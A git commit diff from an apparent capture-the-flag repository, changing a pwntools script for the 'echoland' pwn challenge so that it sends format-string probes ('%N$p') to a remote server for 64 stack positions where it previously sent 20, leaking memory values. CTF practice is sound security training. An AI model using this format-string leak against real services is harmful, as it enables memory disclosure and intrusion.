ecc7099b3f98a9712f48f07dec5a85d83e304773
ShundaZhang <zhangshunda@gmail.com>
2023-05-11 10:37:29 +0800

    Solving echoland...

--- ctf/pwn/echoland/dec.py
+++ ctf/pwn/echoland/dec.py
@@ -4,7 +4,7 @@ ip, port = '178.128.46.49', 32052
 io = remote(ip, port)
 
 def detect():
-        for i in range(20):
+        for i in range(64):
                 io.recvuntil('>')
                 io.sendline('%'+str(i+1)+'$p')
                 buf = io.recvline().strip().split(' ')[0]
